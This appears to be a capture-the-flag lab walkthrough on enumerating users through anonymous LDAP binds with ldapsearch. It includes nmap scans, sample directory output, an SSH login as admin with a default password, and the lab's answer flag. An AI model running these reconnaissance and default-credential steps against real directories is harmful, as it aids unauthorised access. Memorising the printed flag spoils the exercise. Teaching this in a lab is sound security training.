# Lab 7.4: LDAP User Enumeration
## Learning Objectives
- Enumerate users via anonymous LDAP
- Understand user discovery
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before enumerating users.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify LDAP service is running:**
   ```bash
   nmap -p 389,636 <target_ip>
   ```

### Step 2: Enumerate Users

Use ldapsearch to enumerate users in the LDAP directory.

**Detailed Steps:**

1. **Verify ldapsearch is installed:**
   ```bash
   which ldapsearch
   ```

2. **Enumerate users:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)"
   ```
   
   Replace `<target_ip>` with your actual target IP and `dc=example,dc=com` with the discovered base DN (e.g., `ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)"`)

   **Command breakdown:**
   - `ldapsearch`: LDAP search tool
   - `-x`: Simple authentication (anonymous bind)
   - `-H ldap://<target_ip>`: LDAP server URL
   - `-b "dc=example,dc=com"`: Base DN (discovered from previous enumeration)
   - `"(objectClass=person)"`: Search filter (finds user objects)

3. **Expected output:**
   ```
   # extended LDIF
   #
   # LDAPv3
   # base <dc=example,dc=com> with scope subtree
   # filter: (objectClass=person)
   # requesting: ALL
   #
   
   # admin, Users, example.com
   dn: cn=admin,ou=Users,dc=example,dc=com
   objectClass: person
   objectClass: organizationalPerson
   objectClass: inetOrgPerson
   cn: admin
   sn: Admin
   uid: admin
   mail: admin@example.com
   
   # user1, Users, example.com
   dn: cn=user1,ou=Users,dc=example,dc=com
   objectClass: person
   objectClass: organizationalPerson
   objectClass: inetOrgPerson
   cn: user1
   sn: User1
   uid: user1
   mail: user1@example.com
   
   # search result
   search: 2
   result: 0 Success
   
   # numResponses: 3
   ```

4. **Extract just usernames:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)" | grep "^cn:"
   ```

   **Expected output:**
   ```
   cn: admin
   cn: user1
   cn: test
   ```

### Step 3: Analyze Results

Review the enumeration output to identify all discovered users.

**Detailed Steps:**

1. **Look for cn (common name) attributes:**
   - `cn: admin` - Username is "admin"
   - `cn: user1` - Username is "user1"
   - `cn: test` - Username is "test"

2. **Look for uid (user ID) attributes:**
   - `uid: admin` - User ID is "admin"
   - `uid: user1` - User ID is "user1"

3. **Look for mail attributes:**
   - `mail: admin@example.com` - Email address
   - `mail: user1@example.com` - Email address

4. **Document discovered users:**
   ```
   Discovered Users:
   - admin (cn=admin,ou=Users,dc=example,dc=com)
   - user1 (cn=user1,ou=Users,dc=example,dc=com)
   - test (cn=test,ou=Users,dc=example,dc=com)
   ```

5. **Alternative: Query specific attributes:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)" cn uid mail
   ```

### Step 4: Access Flag

The flag is located in /tmp/flag.txt on the LDAP server.

**Detailed Steps:**

1. **If you have shell access:**
   ```bash
   ssh admin@<target_ip>
   # Password: password
   ```

2. **Navigate to flag location:**
   ```bash
   cat /tmp/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{ldap_us3r_3num}
   ```

4. **Alternative: Check if flag references discovered users:**
   - Flag may contain username information
   - Check enumeration output for flag references

5. **Verify file exists:**
   ```bash
   ls -la /tmp/flag.txt
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{ldap_us3r_3num}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and LDAP service accessibility
- ✅ Enumerated users using ldapsearch with objectClass=person filter
- ✅ Identified base DN (dc=example,dc=com) from previous enumeration
- ✅ Analyzed results and extracted usernames (cn attributes)
- ✅ Documented all discovered users
- ✅ Successfully accessed flag in /tmp/flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- User enumeration reveals potential targets for attacks
- objectClass=person filter finds user accounts
- cn (common name) and uid (user ID) are common username attributes
- Understanding LDAP user structure is essential
- User enumeration enables targeted brute force attacks
## Hints
1. Use objectClass=person filter
2. Look for cn attributes
3. Users typically have person objectClass